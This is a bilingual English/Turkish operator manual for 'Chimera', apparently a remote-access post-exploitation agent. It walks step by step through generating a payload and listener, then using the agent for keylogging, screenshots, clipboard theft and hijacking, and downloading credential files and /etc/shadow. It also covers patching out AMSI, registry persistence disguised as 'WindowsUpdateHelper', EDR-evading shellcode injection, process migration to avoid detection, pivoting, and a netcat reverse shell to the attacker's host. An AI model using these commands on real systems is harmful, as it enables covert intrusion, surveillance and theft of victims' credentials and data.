# 📖 Chimera Komut Rehberi / Command Usage Guide

[🇬🇧 English](#-english) | [🇹🇷 Türkçe](#-türkçe)

---

<a name="-english"></a>
## 🇬🇧 English

This document provides a comprehensive, command-by-command reference for the **Chimera** payload system. Each section covers syntax, parameters, expected output, and a step-by-step usage scenario.

---

### Quick Start

**Step 1 — Generate a payload:**
```
mah > use payloads/python/chimera/generate
chimera/generate > set LHOST 192.168.1.10
chimera/generate > set LPORT 4444
chimera/generate > run
```

**Step 2 — Start the listener:**
```
mah > use exploit/multi/handler
handler > set PAYLOAD payloads/python/chimera/generate
handler > set LHOST 0.0.0.0
handler > set LPORT 4444
handler > run
```

**Step 3 — Interact with a session:**
```
mah > sessions -l
mah > sessions -i 1
chimera (1) > help
```

---

## 1. Session Management

### `background` / `bg`
**Description:** Puts the current Chimera session into the background without terminating the agent. The session remains alive and can be resumed with `sessions -i <ID>`.

**Syntax:**
```
chimera (1) > background
chimera (1) > bg
```

**Expected Output:**
```
[*] Session 1 arka plana atıldı.
mah >
```

**Scenario:**
1. You are in an active session but need to switch to another task.
2. Type `bg` to background the session.
3. Run `sessions -l` to confirm the session is still listed.
4. Run `sessions -i 1` to re-enter the session.

---

### `exit` / `quit`
**Description:** Sends a `terminate` signal to the agent, causing it to stop its main loop and exit. This **closes the session permanently**.

**Syntax:**
```
chimera (1) > exit
chimera (1) > quit
```

**Expected Output:**
```
[*] Bağlantı kapatılıyor...
mah >
```

> ⚠️ **Warning:** `exit` terminates the remote agent process. Use `background` to keep the session alive.

---

## 2. System Information

### `sysinfo`
**Description:** Retrieves detailed system information from the target machine. Returns OS version, hostname, logged-in user, privilege level, CPU, RAM, disk info, network interfaces, and running process count.

**Syntax:**
```
chimera (1) > sysinfo
```

**Expected Output:**
```
OS          : Windows 10 Pro (10.0.19044) x86_64
Hostname    : DESKTOP-ABCD123
User        : john
Privilege   : User (Non-elevated)
CPU         : Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (12 cores)
RAM         : 7.8 GB / 15.8 GB
Disk        : C:\ — 48.2 GB free of 476.7 GB
Internal IP : 192.168.1.105
Public IP   : 85.x.x.x
Processes   : 142 running
```

**Scenario:**
1. After initial connection, always run `sysinfo` to identify the target.
2. Check the `Privilege` field — if it shows `User`, consider running `amsi_bypass` or privilege escalation modules first.

---

### `detect`
**Description:** Performs a comprehensive environment analysis. Detects 40+ AV/EDR products by scanning running process names, and checks for VM/Sandbox indicators (VMware, VirtualBox, Hyper-V, Sandboxie, etc.). Returns a risk score.

**Syntax:**
```
chimera (1) > detect
```

**Expected Output:**
```
[*] Ortam Analizi Başlatılıyor...

[AV/EDR Tespiti]
  ✓ Windows Defender (MsMpEng.exe) — AKTİF
  ✗ CrowdStrike Falcon — Bulunamadı
  ✗ Kaspersky — Bulunamadı

[VM/Sandbox Tespiti]
  ✗ VMware — Fiziksel makine
  ✗ VirtualBox — Fiziksel makine
  ✓ Hypervisor: Hyper-V aktif olabilir (cpuid sonucu)

[Risk Skoru] : 35 / 100
[Öneri]      : Hedef AV korumalı. Obfuscated payload veya AMSI bypass önerilir.
```

**Scenario:**
1. Run `detect` immediately after `sysinfo`.
2. If risk score > 50, run `amsi_bypass` before executing other commands.
3. If VM is detected, the target may be a sandbox — be cautious with automated analysis.

---

### `pwd`
**Description:** Prints the current working directory on the target machine.

**Syntax:**
```
chimera (1) > pwd
```

**Expected Output:**
```
C:\Users\john\Desktop
```

---

## 3. File Operations

### `ls [path]`
**Description:** Lists directory contents. If no path is given, lists the current directory.

**Syntax:**
```
chimera (1) > ls
chimera (1) > ls C:\Users\john\Documents
chimera (1) > ls /etc
```

**Expected Output:**
```
Directory: C:\Users\john\Desktop

Mode    Size     Name
----    ----     ----
d----            important_files
-a---   14.2 KB  report.docx
-a---   2.1 MB   presentation.pptx
```

---

### `cd <path>`
**Description:** Changes the working directory on the remote agent.

**Syntax:**
```
chimera (1) > cd C:\Users\john\Documents
chimera (1) > cd /tmp
chimera (1) > cd ..
```

**Expected Output:**
```
[+] Dizin değiştirildi: C:\Users\john\Documents
```

---

### `mkdir <path>`
**Description:** Creates a new directory on the remote system.

**Syntax:**
```
chimera (1) > mkdir C:\Temp\loot
chimera (1) > mkdir /tmp/collected
```

---

### `rm <path>`
**Description:** Removes a file or directory (recursively) on the remote system.

**Syntax:**
```
chimera (1) > rm C:\Temp\loot\old_file.txt
chimera (1) > rm /tmp/collected
```

> ⚠️ **Warning:** `rm` is recursive on directories. Double-check the path before executing.

---

### `upload <local_path> [remote_path]`
**Description:** Uploads a local file to the remote system. The file is read locally, Base64-encoded, and sent over the encrypted C2 channel — no intermediate disk writes on the attacker machine.

**Syntax:**
```
chimera (1) > upload /tools/mimikatz.exe C:\Temp\m.exe
chimera (1) > upload payload.py
```

If `remote_path` is omitted, the filename is preserved in the agent's current working directory.

**Expected Output:**
```
[*] Dosya yükleniyor: /tools/mimikatz.exe -> C:\Temp\m.exe (1234567 bytes)
[+] Dosya başarıyla yüklendi: C:\Temp\m.exe
```

**Scenario:**
1. Prepare a tool locally: `cp /usr/share/tools/nc.exe .`
2. Upload it: `upload nc.exe C:\Temp\nc.exe`
3. Execute it: `C:\Temp\nc.exe -e cmd.exe 192.168.1.10 9999`

---

### `download <remote_path>`
**Description:** Downloads a file from the remote system to the attacker's current directory. The file is automatically saved to the framework's working directory.

**Syntax:**
```
chimera (1) > download C:\Users\john\Documents\passwords.txt
chimera (1) > download /etc/shadow
```

**Expected Output:**
```
[+] Dosya başarıyla indirildi: /home/user/mah-framework/passwords.txt (2048 bytes)
```

**Scenario:**
1. Use `ls` to find interesting files.
2. Run `download C:\Users\john\AppData\Roaming\Microsoft\Credentials\*`
3. Inspect the saved file locally.

---

## 4. Surveillance (Gözetleme)

### `screenshot`
**Description:** Captures a screenshot on the remote system entirely in RAM (no disk write on the target). The image is transferred over the encrypted C2 channel and saved to the `screenshots/` folder on the attacker machine.

**Syntax:**
```
chimera (1) > screenshot
```

**Expected Output:**
```
[+] 📸 Ekran görüntüsü kaydedildi!
    Dosya : /home/user/mah-framework/screenshots/screenshot_20260222_181500_session1.png
    Boyut : 312.45 KB
    Format: PNG
```

**Scenario:**
1. Run `screenshot` to see what the user is currently doing.
2. Run it periodically to monitor activity.
3. Screenshots are saved with timestamps, so you can build a timeline.

---

### `keylogger_start`
**Description:** Starts the keylogger on Windows targets using `ctypes` + `SetWindowsHookEx`. Runs silently in a background thread. **Windows only.**

**Syntax:**
```
chimera (1) > keylogger_start
```

**Expected Output:**
```
[+] Keylogger başlatıldı (Arka planda çalışıyor).
```

---

### `keylogger_stop`
**Description:** Stops the running keylogger thread.

**Syntax:**
```
chimera (1) > keylogger_stop
```

**Expected Output:**
```
[+] Keylogger durduruldu.
```

---

### `keylogger_dump`
**Description:** Retrieves all captured keystrokes from the agent's in-memory buffer. The log is automatically saved to the `logs/` directory on the attacker machine and also displayed (first 10 lines).

**Syntax:**
```
chimera (1) > keylogger_dump
```

**Expected Output:**
```
[+] ⌨️  Keylogger dökümü alındı!
    Dosya : /home/user/mah-framework/logs/keylog_20260222_181520_session1.txt
    Boyut : 1024 karakter
----------------------------------------
[20:14:01] [Window: Chrome] hello world
[20:14:45] [Window: Notepad] password123
[20:15:00] [Window: CMD] ipconfig
...
----------------------------------------
```

**Scenario (Full Workflow):**
1. `keylogger_start` — Start capturing.
2. Wait 10–15 minutes while the user is active.
3. `keylogger_dump` — Retrieve captured data.
4. `keylogger_stop` — Stop capturing.

---

### `clipboard_get`
**Description:** Reads the current contents of the remote system's clipboard.

**Syntax:**
```
chimera (1) > clipboard_get
```

**Expected Output:**
```
----------------------------------------
[+] 📋 Pano İçeriği:
----------------------------------------
hunter2
----------------------------------------
```

---

### `clipboard_set <text>`
**Description:** Writes arbitrary text to the remote system's clipboard.

**Syntax:**
```
chimera (1) > clipboard_set http://malicious-site.example.com/fake-update
```

**Expected Output:**
```
[+] Pano içeriği değiştirildi.
```

---

## 5. Command Execution & Shell

### `<system_command>`
**Description:** Any unrecognized command is passed directly to the target's operating system shell as a subprocess command. Output is returned encrypted.

**Syntax:**
```
chimera (1) > whoami
chimera (1) > ipconfig /all
chimera (1) > cat /etc/passwd
chimera (1) > ps aux
```

**Expected Output:**
```
nt authority\system
```

---

### `shell`
**Description:** Launches a full interactive shell session on the target (`cmd.exe` on Windows, `/bin/bash` on Linux/macOS). The shell is connected bidirectionally to the handler. Traffic remains AES-256-GCM encrypted. Exit with `exit`.

**Syntax:**
```
chimera (1) > shell
```

**Expected Output:**
```
[*] Shell oturumu başlatılıyor...
[+] Shell aktif. Çıkmak için 'exit' yazın.
--------------------------------------------------

C:\Users\john\Desktop> dir
 Volume in drive C has no label.
 Directory of C:\Users\john\Desktop

02/22/2026  06:15 PM    <DIR>          .
02/22/2026  06:15 PM    <DIR>          ..
02/22/2026  05:30 PM         1,024,256 report.docx

C:\Users\john\Desktop> exit
[*] Shell oturumu sonlandırıldı.
chimera (1) >
```

> 📝 **Note:** After `exit`, the agent automatically reconnects and the session is re-established.

---

## 6. Module Management (In-Memory)

### `loadmodule <local_file>`
**Description:** Reads a local Python file, encodes it in Base64, and sends it to the agent. The agent loads and executes the module **entirely in RAM** using `exec()` + `types.ModuleType` — **no file is written to disk** on the target.

**Syntax:**
```
chimera (1) > loadmodule /path/to/my_module.py
chimera (1) > loadmodule modules/post/chimera/example_post.py
```

**Expected Output:**
```
[*] Modül gönderiliyor: my_module (4096 bytes)
[+] Modül 'my_module' belleğe yüklendi.
```

---

### `listmodules`
**Description:** Lists all modules currently loaded in the agent's memory.

**Syntax:**
```
chimera (1) > listmodules
```

**Expected Output:**
```
[+] Yüklü Modüller:
  - my_module
  - recon_module
  - hashdump
```

---

### `runmodule <name> [function]`
**Description:** Executes a previously loaded in-memory module. If a function name is provided, that function is called; otherwise, the module's default entry point is used.

**Syntax:**
```
chimera (1) > runmodule my_module
chimera (1) > runmodule recon_module collect_data
```

**Expected Output:**
```
[*] Modül 'my_module' çalıştırılıyor...
[+] Sonuç:
...module output here...
```

**Full Scenario:**
1. Write a post-exploitation module: `my_recon.py`
2. `loadmodule my_recon.py`
3. `listmodules` — verify it is loaded
4. `runmodule my_recon collect`

---

## 7. Evasion & Persistence

### `amsi_bypass`
**Description:** Patches the Windows AMSI (Antimalware Scan Interface) in the agent's process memory using `ctypes`. This disables PowerShell/script-block scanning for the current process. **Windows only.**

**Syntax:**
```
chimera (1) > amsi_bypass
```

**Expected Output:**
```
[+] AMSI bypass başarılı. amsi.dll bellekte patchlendi.
```

**Scenario:**
1. Run `detect` first to confirm AMSI/Defender is active.
2. Run `amsi_bypass`.
3. Now run PowerShell payloads or `.NET` assemblies without AMSI blocking them.

---

### `persistence_install`
**Description:** Installs the agent as a persistent startup entry on the target system. Method varies by OS:
- **Windows:** Adds a `Run` registry key (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
- **Linux:** Adds a crontab entry (`@reboot`) or writes to `~/.bashrc`.
- **macOS:** Creates a LaunchAgent plist in `~/Library/LaunchAgents/`.

**Syntax:**
```
chimera (1) > persistence_install
```

**Expected Output:**
```
[+] Kalıcılık kuruldu.
    Yöntem : Registry Run Key (HKCU)
    Anahtar : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper
    Değer   : C:\Users\john\AppData\Roaming\agent.exe
```

---

### `persistence_remove`
**Description:** Removes all persistence entries that were installed by `persistence_install`. Cleans up registry keys, crontab entries, or LaunchAgent plists.

**Syntax:**
```
chimera (1) > persistence_remove
```

**Expected Output:**
```
[+] Kalıcılık ayarları temizlendi.
```

---

## 8. Process Injection / Migration

### `inject_list`
**Description:** Lists running processes on the target that are suitable for shellcode injection. Filters out system-critical processes and shows PID, name, and architecture.

**Syntax:**
```
chimera (1) > inject_list
```

**Expected Output:**
```
[+] Enjeksiyona Uygun Süreçler:
  PID   Name                 Arch
  ----  -------------------  ----
  1234  notepad.exe          x64
  5678  explorer.exe         x64
  9012  svchost.exe          x64
```

---

### `inject_shellcode <PID> <local_shellcode_file>`
**Description:** Reads a raw shellcode binary file locally, encodes it in Base64, and injects it into the target process's memory using `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread`.

**Syntax:**
```
chimera (1) > inject_shellcode 1234 /path/to/shellcode.bin
```

**Expected Output:**
```
[*] Shellcode yükleniyor: shellcode.bin (512 bytes) → PID 1234
[+] Shellcode enjekte edildi. Thread ID: 5678
```

---

### `inject_shellcode_nt <PID> <local_shellcode_file>`
**Description:** Same as `inject_shellcode` but uses `NtCreateThreadEx` instead of `CreateRemoteThread`. This technique is more likely to bypass EDR products that hook the standard API.

**Syntax:**
```
chimera (1) > inject_shellcode_nt 1234 /path/to/shellcode.bin
```

---

### `inject_migrate <PID> [local_shellcode_file]`
**Description:** Migrates the agent to another process. If a shellcode file is provided, it is injected; otherwise, the agent attempts migration using its own payload.

**Syntax:**
```
chimera (1) > inject_migrate 1234
chimera (1) > inject_migrate 1234 /path/to/agent_shellcode.bin
```

**Scenario:**
1. `inject_list` — find a stable, long-running process (e.g., `explorer.exe`).
2. `inject_migrate 5678 /payloads/chimera_shellcode.bin`
3. The agent now runs inside `explorer.exe`, making it harder to detect and kill.

---

## 9. Port Forwarding (Tunneling)

### `portfwd add <local_port> <remote_host> <remote_port>`
**Description:** Opens a listening port on the target machine and forwards all traffic to a specified internal host:port. Useful for pivoting into internal network segments.

**Syntax:**
```
chimera (1) > portfwd add 8080 192.168.10.5 80
```

**Expected Output:**
```
[+] Tünel başlatıldı: 0.0.0.0:8080 → 192.168.10.5:80 (ID: 0)
```

**Scenario (Pivoting to Internal RDP):**
1. `portfwd add 13389 10.10.10.5 3389`
2. On your attacker machine: `xfreerdp /v:192.168.1.105:13389 /u:Administrator`
3. You are now connected to an internal RDP server via the Chimera pivot.

---

### `portfwd list`
**Description:** Lists all active port forwarding tunnels.

**Syntax:**
```
chimera (1) > portfwd list
```

**Expected Output:**
```
[+] Aktif Tüneller:
  ID  Local Port  Remote Host      Remote Port  Status
  --  ----------  ---------------  -----------  ------
  0   8080        192.168.10.5     80           Aktif
  1   13389       10.10.10.5       3389         Aktif
```

---

### `portfwd del <ID>`
**Description:** Removes a specific tunnel by its ID (as shown in `portfwd list`).

**Syntax:**
```
chimera (1) > portfwd del 0
```

---

### `portfwd stop`
**Description:** Stops and removes all active port forwarding tunnels.

**Syntax:**
```
chimera (1) > portfwd stop
```

---

## 10. Network Scanner

### `netscan sweep <CIDR> [timeout]`
**Description:** Performs a ping sweep across a CIDR range to discover live hosts. Runs multi-threaded for speed. Timeout is in seconds (default: 1).

**Syntax:**
```
chimera (1) > netscan sweep 192.168.1.0/24
chimera (1) > netscan sweep 10.10.0.0/16 0.5
```

**Expected Output:**
```
[*] Ağ taraması başlatıldı, lütfen bekleyin...
[+] Canlı Hostlar (192.168.1.0/24):
  192.168.1.1   — Aktif (0.8ms)
  192.168.1.105 — Aktif (loopback)
  192.168.1.200 — Aktif (2.1ms)
  Toplam: 3 host bulundu.
```

---

### `netscan arp [CIDR]`
**Description:** Reads the ARP cache from the target system to discover local network neighbors (Layer 2 discovery, no ICMP required).

**Syntax:**
```
chimera (1) > netscan arp
chimera (1) > netscan arp 192.168.1.0/24
```

**Expected Output:**
```
[+] ARP Tablosu:
  IP               MAC Address         Interface
  ---------------  ------------------  ---------
  192.168.1.1      aa:bb:cc:dd:ee:ff  Ethernet0
  192.168.1.200    11:22:33:44:55:66  Ethernet0
```

---

### `netscan ports <HOST> [range]`
**Description:** Performs a TCP port scan on the specified target. Port range can be a hyphen-separated range or comma-separated list. Default: 1-1024.

**Syntax:**
```
chimera (1) > netscan ports 10.10.10.5
chimera (1) > netscan ports 10.10.10.5 1-65535
chimera (1) > netscan ports 10.10.10.5 22,80,443,3389,8080
```

**Expected Output:**
```
[*] Ağ taraması başlatıldı, lütfen bekleyin...
[+] 10.10.10.5 — Açık Portlar:
  PORT    STATE   SERVICE
  ------  ------  -------
  22      open    SSH
  80      open    HTTP
  443     open    HTTPS
  3389    open    RDP
```

---

## 11. Help

### `help` / `?`
**Description:** Displays the built-in command reference table within the Chimera session.

**Syntax:**
```
chimera (1) > help
chimera (1) > ?
```

---

<a name="-türkçe"></a>
## 🇹🇷 Türkçe

Bu belge, **Chimera** payload sisteminin tüm komutlarını detaylı biçimde açıklayan kapsamlı bir referans rehberidir. Her bölümde komut sözdizimi, parametreler, beklenen çıktı ve adım adım kullanım senaryosu bulunmaktadır.

---

### Hızlı Başlangıç

**Adım 1 — Payload oluştur:**
```
mah > use payloads/python/chimera/generate
chimera/generate > set LHOST 192.168.1.10
chimera/generate > set LPORT 4444
chimera/generate > run
```

**Adım 2 — Dinleyiciyi başlat:**
```
mah > use exploit/multi/handler
handler > set PAYLOAD payloads/python/chimera/generate
handler > set LHOST 0.0.0.0
handler > set LPORT 4444
handler > run
```

**Adım 3 — Oturumla etkileşime geç:**
```
mah > sessions -l
mah > sessions -i 1
chimera (1) > help
```

---

## 1. Oturum Yönetimi

### `background` / `bg`
**Açıklama:** Mevcut Chimera oturumunu ajanı sonlandırmadan arka plana atar. Oturum açık kalır; `sessions -i <ID>` ile geri dönülebilir.

**Kullanım:**
```
chimera (1) > background
chimera (1) > bg
```

**Beklenen Çıktı:**
```
[*] Session 1 arka plana atıldı.
mah >
```

---

### `exit` / `quit`
**Açıklama:** Ajana `terminate` sinyali göndererek ana döngüsünü durdurur ve uzak ajanı sonlandırır. Bu komut **oturumu kalıcı olarak kapatır**.

**Kullanım:**
```
chimera (1) > exit
```

> ⚠️ **Uyarı:** `exit` uzaktaki ajan sürecini sonlandırır. Oturumu açık tutmak için `background` kullanın.

---

## 2. Sistem Bilgisi

### `sysinfo`
**Açıklama:** Hedef makineden ayrıntılı sistem bilgisi alır. İşletim sistemi sürümü, bilgisayar adı, kullanıcı, yetki seviyesi, CPU, RAM, disk bilgisi, ağ arayüzleri ve çalışan süreç sayısını döndürür.

**Kullanım:**
```
chimera (1) > sysinfo
```

---

### `detect`
**Açıklama:** Kapsamlı bir ortam analizi yapar. Çalışan süreçleri tarayarak 40'tan fazla AV/EDR ürünü tespit eder; VMware, VirtualBox, Hyper-V gibi VM/Sandbox göstergelerini kontrol eder. Bir risk skoru döndürür.

**Kullanım:**
```
chimera (1) > detect
```

**Senaryo:**
1. `sysinfo` komutunun hemen ardından `detect` çalıştırın.
2. Risk skoru 50'nin üzerindeyse önce `amsi_bypass` komutunu çalıştırın.
3. VM tespit edilirse hedef bir sandbox olabilir — dikkatli olun.

---

### `pwd`
**Açıklama:** Hedef makinedeki mevcut çalışma dizinini gösterir.

**Kullanım:**
```
chimera (1) > pwd
```

---

## 3. Dosya İşlemleri

### `ls [dizin]`
**Açıklama:** Dizin içeriğini listeler. Dizin belirtilmezse mevcut dizin listelenir.

**Kullanım:**
```
chimera (1) > ls
chimera (1) > ls C:\Users\john\Documents
```

---

### `cd <dizin>`
**Açıklama:** Uzak ajanın çalışma dizinini değiştirir.

**Kullanım:**
```
chimera (1) > cd C:\Users\john\Documents
chimera (1) > cd /tmp
chimera (1) > cd ..
```

---

### `mkdir <dizin>`
**Açıklama:** Uzak sistemde yeni bir dizin oluşturur.

**Kullanım:**
```
chimera (1) > mkdir C:\Temp\loot
```

---

### `rm <yol>`
**Açıklama:** Uzak sistemdeki bir dosyayı veya dizini (yinelemeli olarak) siler.

**Kullanım:**
```
chimera (1) > rm C:\Temp\loot\eski_dosya.txt
```

> ⚠️ **Uyarı:** Dizinlerde `rm` yinelemeli çalışır. Komutu çalıştırmadan önce yolu iki kez kontrol edin.

---

### `upload <yerel_yol> [uzak_yol]`
**Açıklama:** Yerel bir dosyayı uzak sisteme yükler. Dosya okunur, Base64 ile kodlanır ve şifreli C2 kanalı üzerinden gönderilir — hedefte ara disk yazısı olmaz. `uzak_yol` belirtilmezse ajanın mevcut dizinine kaydedilir.

**Kullanım:**
```
chimera (1) > upload /araçlar/mimikatz.exe C:\Temp\m.exe
chimera (1) > upload payload.py
```

**Beklenen Çıktı:**
```
[*] Dosya yükleniyor: /araçlar/mimikatz.exe -> C:\Temp\m.exe (1234567 bytes)
[+] Dosya başarıyla yüklendi: C:\Temp\m.exe
```

---

### `download <uzak_yol>`
**Açıklama:** Uzak sistemdeki bir dosyayı saldırganın mevcut dizinine indirir. Dosya şifreli kanal üzerinden transfer edilir.

**Kullanım:**
```
chimera (1) > download C:\Users\john\Documents\sifreler.txt
chimera (1) > download /etc/shadow
```

**Beklenen Çıktı:**
```
[+] Dosya başarıyla indirildi: /home/user/mah-framework/sifreler.txt (2048 bytes)
```

---

## 4. Gözetleme

### `screenshot`
**Açıklama:** Uzak sistemde anlık ekran görüntüsü alır. Görüntü tamamen RAM üzerinden işlenir — hedefin diskine hiçbir şey yazılmaz. Şifreli C2 kanalı üzerinden transfer edilir ve saldırganın `screenshots/` klasörüne kaydedilir.

**Kullanım:**
```
chimera (1) > screenshot
```

---

### `keylogger_start`
**Açıklama:** Windows hedeflerde `ctypes` + `SetWindowsHookEx` kullanarak keylogger başlatır. Arka plan iş parçacığında sessizce çalışır. **Yalnızca Windows.**

**Kullanım:**
```
chimera (1) > keylogger_start
```

---

### `keylogger_stop`
**Açıklama:** Çalışan keylogger iş parçacığını durdurur.

**Kullanım:**
```
chimera (1) > keylogger_stop
```

---

### `keylogger_dump`
**Açıklama:** Ajanın bellek içi tamponundan yakalanan tüm tuş vuruşlarını alır. Log otomatik olarak saldırganın `logs/` dizinine kaydedilir ve ilk 10 satırı ekranda gösterilir.

**Kullanım:**
```
chimera (1) > keylogger_dump
```

**Tam Senaryo:**
1. `keylogger_start` — Yakalamayı başlat.
2. Kullanıcı aktifken 10–15 dakika bekle.
3. `keylogger_dump` — Yakalanan veriyi al.
4. `keylogger_stop` — Yakalamayı durdur.

---

### `clipboard_get`
**Açıklama:** Uzak sistemin panosunun mevcut içeriğini okur.

**Kullanım:**
```
chimera (1) > clipboard_get
```

---

### `clipboard_set <metin>`
**Açıklama:** Uzak sistemin panosuna istediğiniz metni yazar.

**Kullanım:**
```
chimera (1) > clipboard_set http://kotu-site.example.com/sahte-guncelleme
```

---

## 5. Komut Çalıştırma ve Shell

### `<sistem_komutu>`
**Açıklama:** Tanınmayan her komut, alt süreç olarak doğrudan hedef işletim sistemi kabuğuna iletilir. Çıktı şifreli olarak döndürülür.

**Kullanım:**
```
chimera (1) > whoami
chimera (1) > ipconfig /all
chimera (1) > cat /etc/passwd
chimera (1) > ps aux
```

---

### `shell`
**Açıklama:** Hedefte tam bir etkileşimli kabuk oturumu başlatır (Windows'ta `cmd.exe`, Linux/macOS'ta `/bin/bash`). Trafik AES-256-GCM ile şifreli kalmaya devam eder. Çıkmak için `exit` yazın.

**Kullanım:**
```
chimera (1) > shell
```

> 📝 **Not:** `exit` sonrasında ajan otomatik olarak yeniden bağlanır ve oturum yeniden kurulur.

---

## 6. Modül Yönetimi (Bellek İçi)

### `loadmodule <yerel_dosya>`
**Açıklama:** Yerel bir Python dosyasını okur, Base64 ile kodlar ve ajana gönderir. Ajan modülü `exec()` + `types.ModuleType` kullanarak **tamamen RAM'de** yükler ve çalıştırır — hedefin diskine **hiçbir dosya yazılmaz**.

**Kullanım:**
```
chimera (1) > loadmodule /yol/modulum.py
chimera (1) > loadmodule modules/post/chimera/example_post.py
```

---

### `listmodules`
**Açıklama:** Ajanın belleğinde yüklü olan tüm modülleri listeler.

**Kullanım:**
```
chimera (1) > listmodules
```

---

### `runmodule <isim> [fonksiyon]`
**Açıklama:** Daha önce belleğe yüklenmiş bir modülü çalıştırır. Fonksiyon adı belirtilirse o fonksiyon çağrılır; aksi hâlde modülün varsayılan giriş noktası kullanılır.

**Kullanım:**
```
chimera (1) > runmodule modulum
chimera (1) > runmodule keşif_modulu veri_topla
```

---

## 7. Evasion ve Kalıcılık

### `amsi_bypass`
**Açıklama:** `ctypes` kullanarak Windows AMSI'yi (Kötü Amaçlı Yazılım Tarama Arayüzü) ajan sürecinin belleğinde patchler. Bu işlem mevcut süreç için PowerShell/script-block taramasını devre dışı bırakır. **Yalnızca Windows.**

**Kullanım:**
```
chimera (1) > amsi_bypass
```

**Senaryo:**
1. `detect` ile AMSI/Defender'ın aktif olduğunu doğrulayın.
2. `amsi_bypass` komutunu çalıştırın.
3. Artık PowerShell payload veya .NET assembly'leri AMSI engeli olmadan çalışır.

---

### `persistence_install`
**Açıklama:** Ajanı hedef sistemin başlangıç mekanizmasına ekler. İşletim sistemine göre yöntem değişir:
- **Windows:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` kayıt defteri anahtarı.
- **Linux:** `@reboot` crontab kaydı veya `~/.bashrc` satırı.
- **macOS:** `~/Library/LaunchAgents/` altında LaunchAgent plist dosyası.

**Kullanım:**
```
chimera (1) > persistence_install
```

---

### `persistence_remove`
**Açıklama:** `persistence_install` tarafından oluşturulan tüm kalıcılık kayıtlarını temizler.

**Kullanım:**
```
chimera (1) > persistence_remove
```

---

## 8. Süreç Enjeksiyonu / Migrasyon

### `inject_list`
**Açıklama:** Hedef sistemde shellcode enjeksiyonuna uygun çalışan süreçleri listeler. Kritik sistem süreçlerini filtreler ve PID, ad ve mimari bilgisini gösterir.

**Kullanım:**
```
chimera (1) > inject_list
```

---

### `inject_shellcode <PID> <yerel_shellcode_dosyası>`
**Açıklama:** Yerel bir ham shellcode ikili dosyasını okur, Base64 ile kodlar ve hedef sürecin belleğine `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` kullanarak enjekte eder.

**Kullanım:**
```
chimera (1) > inject_shellcode 1234 /yol/shellcode.bin
```

---

### `inject_shellcode_nt <PID> <yerel_shellcode_dosyası>`
**Açıklama:** `inject_shellcode` ile aynıdır ancak standart API'yi hooklayan EDR ürünlerini atlatmak için `CreateRemoteThread` yerine `NtCreateThreadEx` kullanır.

**Kullanım:**
```
chimera (1) > inject_shellcode_nt 1234 /yol/shellcode.bin
```

---

### `inject_migrate <PID> [yerel_shellcode_dosyası]`
**Açıklama:** Ajanı başka bir sürece migrate eder. Shellcode dosyası verilirse enjekte edilir; verilmezse ajan kendi payload'ı ile migrasyon dener.

**Kullanım:**
```
chimera (1) > inject_migrate 1234
chimera (1) > inject_migrate 1234 /yol/ajan_shellcode.bin
```

**Senaryo:**
1. `inject_list` ile stabil ve uzun süre çalışan bir süreç bulun (ör: `explorer.exe`).
2. `inject_migrate 5678 /payloads/chimera_shellcode.bin`
3. Ajan artık `explorer.exe` içinde çalışır — tespit ve sonlandırılması çok daha zordur.

---

## 9. Port Yönlendirme (Tünelleme)

### `portfwd add <yerel_port> <uzak_host> <uzak_port>`
**Açıklama:** Hedef makinede bir dinleme portu açar ve gelen tüm trafiği belirtilen iç ağ host:port adresine yönlendirir. İç ağ segmentlerine pivot için uygundur.

**Kullanım:**
```
chimera (1) > portfwd add 8080 192.168.10.5 80
```

**Senaryo (İç ağ RDP Pivotu):**
1. `portfwd add 13389 10.10.10.5 3389`
2. Saldırgan makinesinde: `xfreerdp /v:192.168.1.105:13389 /u:Administrator`
3. Artık Chimera pivotu üzerinden iç ağ RDP sunucusuna bağlandınız.

---

### `portfwd list`
**Açıklama:** Tüm aktif port yönlendirme tünellerini listeler.

**Kullanım:**
```
chimera (1) > portfwd list
```

---

### `portfwd del <ID>`
**Açıklama:** Belirli bir tüneli ID'sine göre kaldırır (`portfwd list` çıktısındaki ID).

**Kullanım:**
```
chimera (1) > portfwd del 0
```

---

### `portfwd stop`
**Açıklama:** Tüm aktif port yönlendirme tünellerini durdurur ve kaldırır.

**Kullanım:**
```
chimera (1) > portfwd stop
```

---

## 10. Ağ Tarayıcı

### `netscan sweep <CIDR> [zaman_aşımı]`
**Açıklama:** Bir CIDR aralığında canlı hostları keşfetmek için ping taraması yapar. Çok iş parçacıklı çalışır. Zaman aşımı saniye cinsinden belirtilir (varsayılan: 1).

**Kullanım:**
```
chimera (1) > netscan sweep 192.168.1.0/24
chimera (1) > netscan sweep 10.10.0.0/16 0.5
```

---

### `netscan arp [CIDR]`
**Açıklama:** Hedef sistemin ARP önbelleğini okuyarak yerel ağ komşularını keşfeder (ICMP gerektirmez, Katman 2 keşfi).

**Kullanım:**
```
chimera (1) > netscan arp
chimera (1) > netscan arp 192.168.1.0/24
```

---

### `netscan ports <host> [aralık]`
**Açıklama:** Belirtilen hedefe TCP port taraması yapar. Port aralığı tire ile ayrılmış bir aralık veya virgülle ayrılmış liste olabilir. Varsayılan: 1-1024.

**Kullanım:**
```
chimera (1) > netscan ports 10.10.10.5
chimera (1) > netscan ports 10.10.10.5 1-65535
chimera (1) > netscan ports 10.10.10.5 22,80,443,3389,8080
```

---

## 11. Yardım

### `help` / `?`
**Açıklama:** Chimera oturumu içinde dahili komut referans tablosunu gösterir.

**Kullanım:**
```
chimera (1) > help
chimera (1) > ?
```

---

## Komut Özet Tablosu / Command Quick Reference

| Komut                               | Açıklama                        | Platform |
| ----------------------------------- | ------------------------------- | -------- |
| `background` / `bg`                 | Oturumu arka plana at           | Tümü     |
| `exit` / `quit`                     | Ajanı sonlandır                 | Tümü     |
| `sysinfo`                           | Detaylı sistem bilgisi          | Tümü     |
| `detect`                            | AV/EDR ve VM tespiti            | Tümü     |
| `pwd`                               | Mevcut dizini göster            | Tümü     |
| `ls [yol]`                          | Dizin içeriğini listele         | Tümü     |
| `cd <yol>`                          | Dizin değiştir                  | Tümü     |
| `mkdir <yol>`                       | Klasör oluştur                  | Tümü     |
| `rm <yol>`                          | Dosya/klasör sil                | Tümü     |
| `upload <yerel> [uzak]`             | Dosya yükle                     | Tümü     |
| `download <uzak>`                   | Dosya indir                     | Tümü     |
| `screenshot`                        | Ekran görüntüsü al              | Tümü     |
